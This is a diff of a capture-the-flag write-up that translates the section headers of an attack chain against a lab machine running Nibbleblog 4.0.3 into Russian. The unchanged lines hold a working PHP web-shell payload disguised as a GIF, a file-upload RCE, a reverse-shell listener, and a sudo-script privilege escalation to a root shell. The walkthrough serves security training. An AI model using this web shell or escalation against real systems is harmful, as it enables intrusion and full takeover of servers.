@@ -10,11 +10,11 @@
 ## Цепочка Атаки
 
 ```text
-Reconnaissance
+Разведка
 ├── nmap -sC -sV -A → 22 (OpenSSH 7.2p2), 80 (Apache 2.4.18 Ubuntu 16.04)
 └── Burp → HTML-комментарий: <!-- /nibbleblog/ directory. Nothing interesting here! -->
 
-Foothold
+Первичный Доступ
 ├── /nibbleblog/ → "Powered by Nibbleblog"
 ├── /nibbleblog/admin/boot/rules/98-constants.bit → NIBBLEBLOG_VERSION = 4.0.3 "Coffee"
 ├── searchsploit nibbleblog → php/remote/38489.rb (Arbitrary File Upload)
@@ -24,17 +24,17 @@ Foothold
 ├── новый VPN IP → admin:<PASSWORD>
 └── /nibbleblog/admin.php?controller=plugins&action=list → My Image plugin
 
-Exploitation (File Upload)
+Эксплуатация (File Upload)
 ├── cmd.php: GIF8; <?php echo system($_REQUEST['ipp']); ?>
 ├── Upload через My Image → /nibbleblog/content/private/plugins/my_image/image.php
 ├── ?ipp=whoami → RCE (nibbler)
 └── Reverse shell через POST → nc -lvnp 9001
 
-Lateral Movement / User Flag
+Боковое Перемещение
 ├── /home/nibbler/user.txt
 └── Stabilize: python3 -c 'import pty;pty.spawn("/bin/bash")'
 
-Privilege Escalation
+Повышение Привилегий
 ├── sudo -l → (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
 ├── mkdir -p personal/stuff
 ├── echo '/bin/bash -ip' > monitor.sh && chmod +x monitor.sh
